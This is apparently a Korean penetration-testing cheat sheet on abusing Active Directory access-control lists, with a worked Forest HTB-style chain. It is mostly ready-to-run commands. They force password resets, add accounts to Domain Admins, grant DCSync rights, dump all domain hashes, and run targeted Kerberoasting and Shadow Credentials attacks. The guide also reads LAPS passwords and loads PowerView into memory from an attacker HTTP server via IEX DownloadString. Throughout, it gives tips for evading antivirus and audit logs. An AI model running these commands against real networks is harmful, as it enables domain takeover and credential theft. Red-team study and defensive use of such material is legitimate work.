# 06_ACL_악용

# AD 내부침투 — ACL 악용 (DACL Abuse)

---

## 개념

Active Directory의 모든 오브젝트(유저, 그룹, 컴퓨터, 도메인 등)는 DACL(Discretionary Access Control List)을 갖고 있다. DACL은 누가 해당 오브젝트에 어떤 작업을 할 수 있는지를 정의하는 ACE(Access Control Entry) 목록이다. 잘못 설정된 ACL은 낮은 권한의 계정에서 Domain Admin까지 올라갈 수 있는 경로를 만든다.

BloodHound로 ACL 경로를 발견한 뒤 PowerView(Windows) 또는 impacket-dacledit / bloodyAD(Linux)로 악용한다. ACL 변경은 Event ID 5136(AD 오브젝트 속성 변경)과 Event ID 4670(권한 변경)으로 기록된다. 공격 후 원래 상태로 되돌리는 것이 탐지 회피에 중요하다.

adminCount=1로 설정된 계정(DA, EA 등 고권한 계정)은 AdminSDHolder의 보호를 받아 부모 OU의 ACL을 상속받지 않는다. 이 계정들에는 AdminSDHolder에 직접 ACL을 수정해야 한다.

---

## ACL 열거

BloodHound가 있으면 그래프로 바로 확인하는 게 빠르지만, PowerView로 특정 오브젝트의 ACL을 직접 확인할 수도 있다.

```powershell
Import-Module .\PowerView.ps1

# 특정 유저에 대한 ACL 확인
# -ResolveGUIDs: GUID를 사람이 읽을 수 있는 이름으로 변환
Get-DomainObjectAcl -SamAccountName targetuser -ResolveGUIDs

# 특정 그룹에 대한 ACL 확인
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs

# 전체 도메인 ACL에서 위험한 권한 한번에 검색
Get-DomainObjectAcl -ResolveGUIDs | Where-Object {
  $_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteDacl|WriteOwner|ForceChangePassword"
} | Select-Object ObjectDN, IdentityReferenceName, ActiveDirectoryRights

# 스캐너로 악용 가능한 ACL 전체 탐색
Invoke-ACLScanner -ResolveGUIDs | Select-Object ObjectDN, IdentityReferenceName, ActiveDirectoryRights
```

```bash
# Linux — bloodyAD로 내 계정이 쓰기 권한을 가진 오브젝트 확인
bloodyAD --host <DC_IP> -d corp.local -u john -p 'Password1!' \
  get writable

# impacket-dacledit으로 특정 오브젝트 ACL 확인
# -action read: ACL 읽기 모드
# -principal: 권한을 확인할 계정
# -target: 확인할 대상 오브젝트
impacket-dacledit corp.local/john:'Password1!' \
  -dc-ip <DC_IP> \
  -action read \
  -principal john \
  -target targetuser
```

---

## GenericAll — 유저 대상

GenericAll은 대상 오브젝트에 대한 완전한 제어권이다. 유저 대상으로 GenericAll이 있으면 패스워드 강제 변경, SPN 설정(Kerberoasting), Shadow Credentials 공격 등 모든 작업이 가능하다. BloodHound에서 발견 즉시 가장 우선적으로 악용한다.

### 패스워드 강제 변경

현재 패스워드를 알 필요 없이 대상 계정의 패스워드를 임의로 변경한다. 변경 후 새 패스워드로 직접 로그인하거나 PtH로 이어간다. 단, 서비스 계정이나 실제 사용 중인 계정의 패스워드를 바꾸면 서비스 중단이 발생할 수 있으므로 주의해야 한다.

```powershell
# PowerView — 패스워드 변경 (현재 패스워드 불필요)
# ConvertTo-SecureString: 평문 문자열을 SecureString 타입으로 변환 (PowerShell 필수 타입)
# -AsPlainText: 평문으로 입력받음 / -Force: 보안 경고 무시
Set-DomainUserPassword -Identity targetuser `
  -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force) `
  -Verbose

# 다른 계정의 자격증명으로 실행할 때 (내 계정이 아닌 다른 권한 있는 계정 사용)
$Cred = New-Object System.Management.Automation.PSCredential(
  'corp\john',
  (ConvertTo-SecureString 'Password1!' -AsPlainText -Force)
)
Set-DomainUserPassword -Identity targetuser `
  -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force) `
  -Credential $Cred `
  -Verbose

# 패스워드 변경 후 로그인 확인
nxc smb <DC_IP> -u targetuser -p 'NewPass123!'
```

```bash
# Linux — net rpc로 패스워드 변경
# rpc password: RPC를 통한 패스워드 변경 명령
# -U: 권한 있는 계정 (GenericAll 보유 계정)
# -S: DC 주소
net rpc password targetuser 'NewPass123!' \
  -U corp.local/john%'Password1!' \
  -S <DC_IP>

# bloodyAD — 가장 간단한 방법
bloodyAD --host <DC_IP> -d corp.local -u john -p 'Password1!' \
  set password targetuser 'NewPass123!'

# NTLM 해시로 인증 (PtH 상태에서 사용)
bloodyAD --host <DC_IP> -d corp.local -u john -H <NTLM> \
  set password targetuser 'NewPass123!'
```

---

## GenericAll — 그룹 대상

그룹에 GenericAll이 있으면 해당 그룹에 원하는 계정을 자유롭게 추가할 수 있다. 가장 직접적인 권한 상승 방법으로, 자신을 Domain Admins에 추가하면 즉시 DA 권한을 획득한다.

```powershell
# PowerView — 그룹에 유저 추가
# Add-DomainGroupMember: 도메인 그룹에 멤버를 추가하는 PowerView 함수
# -Identity: 멤버를 추가할 대상 그룹
# -Members: 추가할 계정 (sAMAccountName)
Add-DomainGroupMember -Identity 'Domain Admins' -Members john -Verbose

# 자격증명 지정 (GenericAll 권한이 있는 계정으로 실행)
$Cred = New-Object System.Management.Automation.PSCredential(
  'corp\svc_alfresco',
  (ConvertTo-SecureString 'Password' -AsPlainText -Force)
)
Add-DomainGroupMember `
  -Identity 'Exchange Windows Permissions' `
  -Members svc_alfresco `
  -Credential $Cred `
  -Verbose

# 추가됐는지 확인
Get-DomainGroupMember -Identity 'Domain Admins' | Select-Object MemberName
```

```bash
# Linux — bloodyAD
# add groupMember: 그룹에 멤버 추가 명령
bloodyAD --host <DC_IP> -d corp.local -u john -p 'Password1!' \
  add groupMember 'Domain Admins' john

# net rpc로 그룹 멤버 추가
net rpc group addmem "Domain Admins" john \
  -U corp.local/john%'Password1!' \
  -S <DC_IP>

# 추가 확인
net rpc group members "Domain Admins" \
  -U corp.local/john%'Password1!' \
  -S <DC_IP>
```

---

## GenericAll — 컴퓨터 대상

컴퓨터 오브젝트에 GenericAll이 있으면 RBCD(Resource-Based Constrained Delegation) 공격으로 해당 컴퓨터의 관리자 권한을 획득할 수 있다. RBCD는 공격자가 제어하는 컴퓨터 계정이 타겟 컴퓨터를 대신해 Administrator를 사칭하는 방식이다.

```bash
# Linux — bloodyAD로 RBCD 설정
# 1단계: 공격자 컴퓨터 계정 생성 (마신 계정 추가 권한 필요, 기본적으로 도메인 유저도 가능)
bloodyAD --host <DC_IP> -d corp.local -u john -p 'Password1!' \
  add computer 'FAKE01$' 'FakePass123!'

# 2단계: 타겟 컴퓨터에 RBCD 설정
# add rbcd: msDS-AllowedToActOnBehalfOfOtherIdentity 속성 수정
# TARGET$: RBCD를 설정할 타겟 컴퓨터 계정
# FAKE01$: 위임을 허용할 공격자 컴퓨터 계정
bloodyAD --host <DC_IP> -d corp.local -u john -p 'Password1!' \
  add rbcd 'TARGET$' 'FAKE01$'

# 3단계: 공격자 컴퓨터 계정으로 Administrator 사칭 TGS 요청
# -spn: 접근할 서비스 SPN
# -impersonate: 사칭할 계정
impacket-getST \
  -spn 'cifs/target.corp.local' \
  -impersonate Administrator \
  -dc-ip <DC_IP> \
  'corp.local/FAKE01$:FakePass123!'

# 4단계: 획득한 티켓으로 타겟 접근
export KRB5CCNAME=Administrator@cifs_target.corp.local@CORP.LOCAL.ccache
impacket-secretsdump -k -no-pass corp.local/Administrator@target.corp.local
impacket-psexec -k -no-pass corp.local/Administrator@target.corp.local
```

```powershell
# Windows — Powermad + PowerView로 RBCD 설정
Import-Module .\Powermad.ps1
Import-Module .\PowerView.ps1

# 공격자 컴퓨터 계정 생성
New-MachineAccount -MachineAccount "FAKE01" `
  -Password (ConvertTo-SecureString 'FakePass123!' -AsPlainText -Force)

# 생성된 컴퓨터 계정 SID 확인
$sid = Get-DomainComputer -Identity FAKE01 -Properties objectsid |
  Select-Object -ExpandProperty objectsid

# 타겟 컴퓨터에 RBCD 설정
$SD = New-Object Security.AccessControl.RawSecurityDescriptor `
  -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Set-DomainObject -Identity target-server `
  -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

---

## GenericWrite

GenericWrite는 대상 오브젝트의 대부분의 속성을 수정할 수 있는 권한이다. 패스워드 직접 변경은 불가하지만 SPN 설정과 msDS-KeyCredentialLink 수정이 가능하다.

### SPN 설정 → Targeted Kerberoasting

GenericWrite가 있으면 SPN이 없는 계정에 SPN을 강제 설정해 Kerberoastable 상태로 만들 수 있다. KDC는 SPN이 등록된 계정이면 누구나 TGS를 요청할 수 있기 때문에, SPN을 설정한 순간 그 계정의 TGS 해시를 오프라인으로 크래킹할 수 있게 된다.

아래 에러가 발생하면 시간 동기화 문제다. Kerberos는 클라이언트와 DC의 시간 차이가 ±5분을 초과하면 인증을 거부한다.

```
Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

```bash
# [트러블슈팅] KRB_AP_ERR_SKEW 에러 발생 시
sudo timedatectl set-ntp off   # NTP 자동 동기화 비활성화
sudo ntpdate -u <DC_IP>        # DC 시간에 맞춰 동기화
# 작업 완료 후
sudo timedatectl set-ntp on
```

### 1. SPN 수동 설정 후 TGS 요청

### Linux — bloodyAD로 SPN 설정 → GetUserSPNs으로 TGS 요청

칼리에서 직접 실행하는 방식이다. bloodyAD는 LDAP을 통해 AD 오브젝트 속성을 수정하므로 도메인에 참여한 Windows 머신 없이도 동작한다.

```bash
# SPN 설정
# --host: DC의 IP 또는 FQDN
# -d: 도메인 이름
# -u: GenericWrite 권한을 가진 계정
# -p: 해당 계정의 패스워드
# set object: AD 오브젝트의 특정 속성을 수정하는 명령
# targetuser: SPN을 설정할 대상 계정 (sAMAccountName)
# servicePrincipalName: 수정할 속성명 (SPN이 저장되는 AD 속성)
# -v 'http/fake': 설정할 SPN 값 (실제 서비스가 존재하지 않아도 되며 형식만 맞으면 됨)
bloodyAD --host <DC_IP> -d corp.local -u john -p 'Password1!' \
  set object targetuser servicePrincipalName -v 'http/fake'

# NTLM 해시로 인증 (패스워드 크래킹 없이 PtH 상태에서 바로 사용 가능)
# -H: LM:NTLM 또는 :NTLM 형식으로 입력 (LM은 aad3b435...더미값 사용)
bloodyAD --host <DC_IP> -d corp.local -u john -H <NTLM> \
  set object targetuser servicePrincipalName -v 'http/fake'

# SPN 설정 확인
# get object: 특정 오브젝트의 속성값 조회
# --attr: 조회할 속성명 지정
bloodyAD --host <DC_IP> -d corp.local -u john -p 'Password1!' \
  get object targetuser --attr servicePrincipalName

# TGS 요청
# SPN이 설정되면 해당 계정이 Kerberoastable 상태가 됨
# GetUserSPNs이 KDC에 TGS를 요청하고 암호화된 해시를 반환
# -request-user: 특정 계정만 타겟으로 지정해 불필요한 요청 최소화
# -outputfile: 해시를 저장할 파일 경로 (이후 hashcat에 바로 사용 가능)
impacket-GetUserSPNs corp.local/john:'Password1!' \
  -dc-ip <DC_IP> \
  -request-user targetuser \
  -outputfile targeted.hashes

# 공격 완료 후 SPN 제거
# SPN을 제거하지 않으면 AD 감사 로그(Event ID 5136)에 속성 변경 흔적이 남음
# -v '': 빈 값으로 설정해 SPN 속성 초기화
bloodyAD --host <DC_IP> -d corp.local -u john -p 'Password1!' \
  set object targetuser servicePrincipalName -v ''
```

### Windows — PowerView로 SPN 설정 → Rubeus로 TGS 요청

Windows 세션(evil-winrm, psexec 등)에서 실행하는 방식이다. PowerView를 세션에 먼저 로드한 뒤 SPN을 설정한다.

```powershell
# PowerView로 SPN 설정
# Set-DomainObject: 도메인 오브젝트의 속성을 수정하는 PowerView 함수
# -Identity: SPN을 설정할 대상 계정 (sAMAccountName)
# -Set: 설정할 속성과 값을 해시테이블 형식으로 지정
# serviceprincipalname: SPN이 저장되는 AD 속성 (소문자로 입력)
# -Verbose: 실행 결과를 상세하게 출력
Set-DomainObject -Identity targetuser `
  -Set @{serviceprincipalname='http/fake'} -Verbose

# SPN 설정 확인
Get-DomainUser -Identity targetuser -Properties serviceprincipalname

# Rubeus로 TGS 요청
# kerberoast: Kerberoasting 공격 모드
# /user: 타겟 계정 지정
# /nowrap: 해시를 한 줄로 출력 (줄바꿈 없이 hashcat에 바로 붙여넣기 가능)
# /outfile: 해시 저장 파일 경로
.\Rubeus.exe kerberoast /user:targetuser /nowrap /outfile:targeted.hashes

# 공격 완료 후 SPN 제거
# -Clear: 해당 속성을 빈 값으로 초기화
Set-DomainObject -Identity targetuser -Clear serviceprincipalname -Verbose
```

### [트러블슈팅] PowerView 로드 방법

PowerView는 외부 스크립트라 Windows 세션에 미리 로드해야 한다. 디스크에 파일을 남기지 않는 메모리 로드 방식이 탐지 회피에 유리하다.

먼저 칼리에서 PowerView를 다운로드한다.

```bash
# PowerView 단일 파일 다운로드
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1

# 또는 PowerSploit 전체 클론
git clone https://github.com/PowerShellMafia/PowerSploit.git
# PowerView 경로: PowerSploit/Recon/PowerView.ps1
```

**방법 1 — 메모리 로드 (디스크에 파일 안 남음, 권장)**

칼리 HTTP 서버를 열고 Windows 세션에서 직접 메모리에 로드한다. 파일이 디스크에 저장되지 않아 AV 탐지 위험이 낮다.

```bash
# 칼리에서 PowerView.ps1 있는 디렉토리로 이동 후 HTTP 서버 실행
cd /opt/scripts/
python3 -m http.server 80
```

```powershell
# Windows 세션에서 HTTP 서버로부터 직접 메모리에 로드
# IEX(Invoke-Expression): 문자열을 PowerShell 명령으로 실행
# DownloadString: URL의 내용을 문자열로 다운로드해 IEX로 바로 실행
IEX(New-Object Net.WebClient).DownloadString('http://<칼리IP>/PowerView.ps1')

# 또는
IEX(IWR http://<칼리IP>/PowerView.ps1 -UseBasicParsing)
```

**방법 2 — evil-winrm -s 옵션**

evil-winrm으로 세션을 열 때 `-s`로 스크립트 디렉토리를 지정하면 세션 안에서 파일명만 입력해 바로 메모리 로드할 수 있다.

```bash
# 칼리에서 세션 열 때 PowerView가 있는 디렉토리를 -s로 지정
evil-winrm -i <IP> -u john -p 'Password1!' -s /opt/scripts/
```

```powershell
# 세션 안에서 파일명만 입력하면 자동으로 메모리 로드됨
*Evil-WinRM* PS> PowerView.ps1
```

**방법 3 — 파일 업로드 후 로드 (디스크에 파일 남음)**

```powershell
# evil-winrm 세션에서 칼리로부터 파일 업로드
# upload: 칼리 로컬 경로 → Windows 원격 경로 순서로 지정
*Evil-WinRM* PS> upload /opt/scripts/PowerView.ps1 C:\Temp\PowerView.ps1

# 업로드된 파일을 현재 세션에 로드
Import-Module C:\Temp\PowerView.ps1
```

### 2. targetedKerberoast.py (SPN 설정 + TGS 요청 + SPN 제거 자동화)

SPN 설정 → TGS 요청 → SPN 제거를 자동으로 처리한다. LDAP으로 GenericWrite 권한이 있는 계정을 자동으로 탐지하고, 각 계정에 임시 SPN을 설정해 TGS 해시를 추출한 뒤 SPN을 제거한다. 수동 SPN 설정이 필요 없고 한 번의 명령으로 도메인 전체를 스캔할 수 있어 효율적이다.

```bash
# 설치
git clone https://github.com/ShutdownRepo/targetedKerberoast
cd targetedKerberoast
pip install -r requirements.txt --break-system-packages

# 전체 도메인 유저 대상 실행
# -v: verbose 모드 (각 계정 처리 과정과 결과를 출력해 진행 상황 확인 가능)
# 내부 동작: SPN 있는 계정 → 일반 Kerberoast / GenericWrite 있는 계정 → SPN 임시 설정 후 Targeted Kerberoast
python3 targetedKerberoast.py \
  -v \
  -d corp.local \
  -u john \
  -p 'Password1!' \
  --dc-ip <DC_IP>

# 결과를 파일로 저장
python3 targetedKerberoast.py \
  -v \
  -d corp.local \
  -u john \
  -p 'Password1!' \
  --dc-ip <DC_IP> \
  -o kerb.hashes

# 특정 유저만 타겟
python3 targetedKerberoast.py \
  -v \
  -d corp.local \
  -u john \
  -p 'Password1!' \
  --dc-ip <DC_IP> \
  --request-user ethan

# NTLM 해시로 인증 (PtH 상태에서 패스워드 없이 바로 사용)
python3 targetedKerberoast.py \
  -v \
  -d corp.local \
  -u john \
  -H <NTLM> \
  --dc-ip <DC_IP>

# Kerberos 인증 (ccache 있을 때)
export KRB5CCNAME=john.ccache
python3 targetedKerberoast.py \
  -v \
  -d corp.local \
  -u john \
  -k --no-pass \
  --dc-ip <DC_IP>

# SPN 강제 설정 없이 기존 SPN 계정만 대상 (일반 Kerberoast만)
python3 targetedKerberoast.py \
  -v \
  -d corp.local \
  -u john \
  -p 'Password1!' \
  --dc-ip <DC_IP> \
  --no-abuse

# GenericWrite 있는 계정만 대상 (Targeted만)
python3 targetedKerberoast.py \
  -v \
  -d corp.local \
  -u john \
  -p 'Password1!' \
  --dc-ip <DC_IP> \
  --only-abuse
```

### 크랙

```bash
# RC4 (mode 13100) — 가장 빠름, $krb5tgs$23$* 형태
# 크래킹 성공 시 해당 계정 평문 패스워드 획득 → SMB/WinRM/LDAP 직접 로그인 가능
hashcat -m 13100 targeted.hashes /usr/share/wordlists/rockyou.txt
hashcat -m 13100 targeted.hashes /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

# AES128 (mode 19600)
hashcat -m 19600 targeted.hashes /usr/share/wordlists/rockyou.txt

# AES256 (mode 19700)
hashcat -m 19700 targeted.hashes /usr/share/wordlists/rockyou.txt

# 결과 확인
hashcat -m 13100 targeted.hashes --show
```

### msDS-KeyCredentialLink 수정 → Shadow Credentials

GenericWrite가 있으면 msDS-KeyCredentialLink 속성을 수정해 Shadow Credentials 공격을 수행할 수 있다. 이 공격은 대상 계정에 공격자가 제어하는 인증서(키 자격증명)를 등록해, PKINIT(인증서 기반 Kerberos)으로 해당 계정의 TGT 또는 NTLM 해시를 획득하는 방식이다. 패스워드 변경 없이 계정을 탈취하므로 탐지가 어렵다.

Windows Server 2016 이상 DC 환경에서만 동작하며, DC에 PKINIT 지원이 필요하다.

```bash
# Linux — pywhisker로 키 자격증명 추가
# pywhisker는 대상 계정의 msDS-KeyCredentialLink에 자체 서명 인증서를 추가함
pip install pywhisker

pywhisker -d corp.local -u john -p 'Password1!' \
  --target targetuser \
  --action add \
  --dc-ip <DC_IP>
# 출력: PFX 파일과 패스워드가 생성됨
# 예: [+] Saved PFX certificate at: xXxxXx.pfx
#     [+] Password: xxxxxxxxxxxx

# 생성된 PFX로 TGT 요청 (gettgtpkinit.py 사용)
# certipy 또는 PKINITtools 필요
python3 gettgtpkinit.py \
  -cert-pfx <생성된파일>.pfx \
  -pfx-pass <생성된패스워드> \
  corp.local/targetuser \
  targetuser.ccache

# TGT로 NTLM 해시 추출
export KRB5CCNAME=targetuser.ccache
python3 getnthash.py corp.local/targetuser -k

# 또는 certipy로 한번에 처리
certipy shadow auto \
  -u john@corp.local \
  -p 'Password1!' \
  -account targetuser \
  -dc-ip <DC_IP>
```

```powershell
# Windows — Whisker
.\Whisker.exe add /target:targetuser /domain:corp.local /dc:<DC_IP>
# 출력에 Rubeus 명령어가 포함되어 있음 → 그대로 복사 실행

# Whisker가 출력하는 Rubeus 명령어 예시
.\Rubeus.exe asktgt /user:targetuser /certificate:... /password:... /ptt
```

---

## WriteDACL

WriteDACL은 대상 오브젝트의 DACL을 수정할 수 있는 권한이다. 자신에게 원하는 권한을 추가할 수 있으므로 사실상 GenericAll을 자신에게 부여해 완전한 제어권을 획득하거나, 도메인 오브젝트에 DCSync 권한을 부여할 수 있다.

OU(Organizational Unit) 오브젝트에 WriteDACL이 있을 때 `-inheritance` 플래그를 추가하면 해당 OU 아래의 모든 자식 오브젝트에도 ACE가 전파된다. 단, adminCount=1 오브젝트는 AdminSDHolder 보호로 인해 부모 OU의 ACL을 상속받지 않는다.

```powershell
# PowerView — 자신에게 GenericAll 부여 (그룹 대상)
# Add-DomainObjectAcl: 도메인 오브젝트의 ACL에 새 ACE를 추가하는 함수
# -TargetIdentity: ACL을 수정할 대상 오브젝트
# -PrincipalIdentity: 권한을 부여받을 계정
# -Rights All: GenericAll 권한 부여
Add-DomainObjectAcl `
  -TargetIdentity "Domain Admins" `
  -PrincipalIdentity john `
  -Rights All `
  -Verbose

# 도메인 오브젝트에 DCSync 권한 부여 (가장 자주 쓰이는 패턴)
# -Rights DCSync: Replicating Directory Changes + All 권한 동시 부여
$Cred = New-Object System.Management.Automation.PSCredential(
  'corp\svc_alfresco',
  (ConvertTo-SecureString 'Password' -AsPlainText -Force)
)
Add-DomainObjectAcl `
  -TargetIdentity "DC=htb,DC=local" `
  -PrincipalIdentity svc_alfresco `
  -Rights DCSync `
  -Credential $Cred `
  -Verbose

# 권한 부여 확인
Get-DomainObjectAcl "DC=htb,DC=local" -ResolveGUIDs | `
  Where-Object {$_.IdentityReferenceName -eq "svc_alfresco"}
```

```bash
# Linux — impacket-dacledit
# -action write: ACL 쓰기 모드
# -rights DCSync: DCSync 권한 부여 (GetChanges + GetChangesAll)
# -principal: 권한을 부여받을 계정
# -target-dn: ACL을 수정할 대상 오브젝트의 DN
impacket-dacledit corp.local/john:'Password1!' \
  -dc-ip <DC_IP> \
  -action write \
  -rights DCSync \
  -principal john \
  -target-dn "DC=corp,DC=local"

# FullControl(GenericAll) 부여
impacket-dacledit corp.local/john:'Password1!' \
  -dc-ip <DC_IP> \
  -action write \
  -rights FullControl \
  -principal john \
  -target "Domain Admins"

# OU에 상속 포함해서 부여 (하위 모든 오브젝트에 전파)
impacket-dacledit corp.local/john:'Password1!' \
  -dc-ip <DC_IP> \
  -action write \
  -rights FullControl \
  -inheritance \
  -principal john \
  -target-dn "OU=SERVERS,DC=corp,DC=local"

# bloodyAD — GenericAll 부여
bloodyAD --host <DC_IP> -d corp.local -u john -p 'Password1!' \
  add genericAll "Domain Admins" john

# DCSync 권한 부여 후 바로 실행
impacket-secretsdump corp.local/john:'Password1!'@<DC_IP>
```

---

## WriteOwner

WriteOwner는 대상 오브젝트의 소유자를 변경할 수 있는 권한이다. Windows에서 오브젝트의 소유자는 자동으로 WriteDACL 권한을 갖기 때문에, 소유자를 자신으로 변경한 뒤 WriteDACL로 GenericAll을 부여하는 체인 공격이 가능하다.

```powershell
# PowerView
# 1단계: 소유자를 자신으로 변경
# Set-DomainObjectOwner: 오브젝트의 소유자를 변경하는 PowerView 함수
# 소유자가 되면 자동으로 WriteDACL 권한 획득
Set-DomainObjectOwner `
  -Identity "Domain Admins" `
  -OwnerIdentity john `
  -Verbose

# 2단계: 소유자로서 자신에게 GenericAll 부여
Add-DomainObjectAcl `
  -TargetIdentity "Domain Admins" `
  -PrincipalIdentity john `
  -Rights All `
  -Verbose

# 3단계: GenericAll로 그룹에 멤버 추가
Add-DomainGroupMember -Identity "Domain Admins" -Members john -Verbose
```

```bash
# Linux — impacket-owneredit + impacket-dacledit 체인
# 1단계: 소유자 변경
# -action write: 소유자 변경 모드
# -new-owner: 새 소유자로 설정할 계정
impacket-owneredit corp.local/john:'Password1!' \
  -dc-ip <DC_IP> \
  -action write \
  -new-owner john \
  -target "Domain Admins"

# 2단계: GenericAll 부여
impacket-dacledit corp.local/john:'Password1!' \
  -dc-ip <DC_IP> \
  -action write \
  -rights FullControl \
  -principal john \
  -target "Domain Admins"

# bloodyAD — 두 단계를 각각 실행
# 1단계: 소유자 변경
bloodyAD --host <DC_IP> -d corp.local -u john -p 'Password1!' \
  set owner "Domain Admins" john

# 2단계: GenericAll 부여
bloodyAD --host <DC_IP> -d corp.local -u john -p 'Password1!' \
  add genericAll "Domain Admins" john
```

---

## ForceChangePassword

ForceChangePassword는 현재 패스워드를 몰라도 대상 유저의 패스워드를 강제 변경할 수 있는 권한이다. 변경 후 새 패스워드로 로그인하면 해당 계정을 완전히 장악할 수 있다.

주의: 패스워드 변경 시 해당 계정이 현재 실행 중인 서비스나 세션이 끊길 수 있다. 서비스 계정이면 관련 서비스가 중단될 수 있으므로 실제 운영 환경에서는 주의가 필요하다.

```powershell
# PowerView
# Set-DomainUserPassword: 현재 패스워드 없이 강제 변경하는 함수
Set-DomainUserPassword `
  -Identity targetuser `
  -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force) `
  -Verbose

# 자격증명 지정
$Cred = New-Object System.Management.Automation.PSCredential(
  'corp\john',
  (ConvertTo-SecureString 'Password1!' -AsPlainText -Force)
)
Set-DomainUserPassword `
  -Identity targetuser `
  -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force) `
  -Credential $Cred `
  -Verbose
```

```bash
# Linux — net rpc
# rpc password: RPC를 통한 강제 패스워드 변경
# 첫 번째 인자: 대상 계정 / 두 번째 인자: 새 패스워드
net rpc password targetuser 'NewPass123!' \
  -U corp.local/john%'Password1!' \
  -S <DC_IP>

# bloodyAD
bloodyAD --host <DC_IP> -d corp.local -u john -p 'Password1!' \
  set password targetuser 'NewPass123!'

# NTLM 해시로 인증
bloodyAD --host <DC_IP> -d corp.local -u john -H <NTLM> \
  set password targetuser 'NewPass123!'
```

---

## AddMember

AddMember는 특정 그룹에 멤버를 추가할 수 있는 권한이다. GenericAll과 달리 그룹 멤버 추가 기능만 허용된다. 자신을 DA 그룹에 추가하면 즉시 DA 권한을 획득한다.

```powershell
# PowerView
# Add-DomainGroupMember: 그룹에 멤버를 추가하는 PowerView 함수
Add-DomainGroupMember `
  -Identity "Exchange Windows Permissions" `
  -Members svc_alfresco `
  -Verbose

# 추가 확인
Get-DomainGroupMember -Identity "Exchange Windows Permissions"
```

```bash
# Linux — net rpc
net rpc group addmem "Exchange Windows Permissions" john \
  -U corp.local/john%'Password1!' \
  -S <DC_IP>

# bloodyAD
# add groupMember: 그룹에 멤버를 추가하는 명령
bloodyAD --host <DC_IP> -d corp.local -u john -p 'Password1!' \
  add groupMember "Exchange Windows Permissions" john

# 추가 확인
bloodyAD --host <DC_IP> -d corp.local -u john -p 'Password1!' \
  get groupMember "Exchange Windows Permissions"
```

---

## AllExtendedRights

AllExtendedRights는 ForceChangePassword와 AddMember를 포함하는 확장 권한 집합이다. 도메인 오브젝트에 AllExtendedRights가 있으면 DCSync 권한도 포함되어 있어 바로 secretsdump를 실행할 수 있다.

```powershell
# 확인
Get-DomainObjectAcl -ResolveGUIDs | Where-Object {
  $_.ActiveDirectoryRights -match "ExtendedRight"
}
```

```bash
# 도메인 오브젝트에 AllExtendedRights가 있을 때 바로 DCSync 가능
impacket-secretsdump corp.local/john:'Password1!'@<DC_IP>

# nxc로도 가능
nxc smb <DC_IP> -u john -p 'Password1!' --ntds
```

---

## ReadLAPSPassword

LAPS(Local Administrator Password Solution)로 관리되는 머신의 로컬 관리자 패스워드를 읽을 수 있는 권한이다. LAPS는 ms-MCS-AdmPwd 속성에 로컬 관리자 패스워드를 저장하며, 기본적으로 특정 계정만 이 속성을 읽을 수 있다. 권한이 있으면 해당 머신의 로컬 관리자로 즉시 접근 가능하다.

```powershell
# PowerView — LAPS 패스워드 읽기
# ms-mcs-admpwd: LAPS가 로컬 관리자 패스워드를 저장하는 AD 속성
Get-DomainComputer -Identity target-server -Properties ms-mcs-admpwd

# LAPS 패스워드가 설정된 모든 컴퓨터 조회
Get-DomainComputer -Filter {ms-mcs-admpwd -like '*'} `
  -Properties ms-mcs-admpwd, name

# LAPS 읽기 권한이 있는 계정 확인
Find-AdmPwdExtendedRights -ComputerName target-server
```

```bash
# Linux — nxc LAPS 모듈
# -M laps: LAPS 패스워드 읽기 모듈 실행
nxc ldap <DC_IP> -u john -p 'Password1!' -M laps

# bloodyAD — ms-mcs-admpwd 속성 직접 조회
# ms-mcs-admpwd 속성을 가진 모든 컴퓨터 오브젝트 검색
bloodyAD --host <DC_IP> -d corp.local -u john -p 'Password1!' \
  get search --filter '(ms-mcs-admpwd=*)' --attr ms-mcs-admpwd,name

# 획득한 패스워드로 로컬 관리자 접근
# --local-auth: 도메인 인증 대신 로컬 계정으로 인증
nxc smb <타겟_IP> -u Administrator -p '<LAPS_패스워드>' --local-auth
evil-winrm -i <타겟_IP> -u Administrator -p '<LAPS_패스워드>'
impacket-psexec corp.local/Administrator:'<LAPS_패스워드>'@<타겟_IP>
```

---

## 실전 체인 — Forest HTB 스타일

BloodHound에서 발견한 아래 경로를 악용하는 전체 흐름이다.

```
svc_alfresco
  → MemberOf → Account Operators
  → GenericAll → Exchange Windows Permissions 그룹
  → WriteDACL → 도메인
```

```powershell
# 1. PowerView 메모리 로드
IEX(New-Object Net.WebClient).DownloadString('http://<칼리IP>/PowerView.ps1')

# 2. GenericAll 악용 — svc_alfresco를 Exchange Windows Permissions 그룹에 추가
# Account Operators가 Exchange Windows Permissions에 GenericAll을 가지므로 멤버 추가 가능
Add-DomainGroupMember `
  -Identity 'Exchange Windows Permissions' `
  -Members svc_alfresco `
  -Verbose

# 추가 확인
Get-DomainGroupMember -Identity 'Exchange Windows Permissions' | Select-Object MemberName

# 3. WriteDACL 악용 — svc_alfresco에게 DCSync 권한 부여
# Exchange Windows Permissions 그룹이 도메인에 WriteDACL을 가지므로 DCSync 권한 부여 가능
$Cred = New-Object System.Management.Automation.PSCredential(
  'htb\svc_alfresco',
  (ConvertTo-SecureString 'Password' -AsPlainText -Force)
)
Add-DomainObjectAcl `
  -TargetIdentity "DC=htb,DC=local" `
  -PrincipalIdentity svc_alfresco `
  -Rights DCSync `
  -Credential $Cred `
  -Verbose
```

```bash
# 4. DCSync 실행 — 도메인 전체 해시 덤프
# svc_alfresco가 DCSync 권한을 갖게 됐으므로 secretsdump 실행 가능
impacket-secretsdump htb.local/svc_alfresco:'Password'@<DC_IP>

# nxc로도 가능
nxc smb <DC_IP> -u svc_alfresco -p 'Password' --ntds

# 5. Pass-the-Hash — Administrator 해시로 DC 접근
# 덤프된 Administrator NTLM 해시로 직접 로그인
evil-winrm -i <DC_IP> -u Administrator -H <NTLM>
impacket-psexec -hashes :<NTLM> corp.local/Administrator@<DC_IP>
```

---

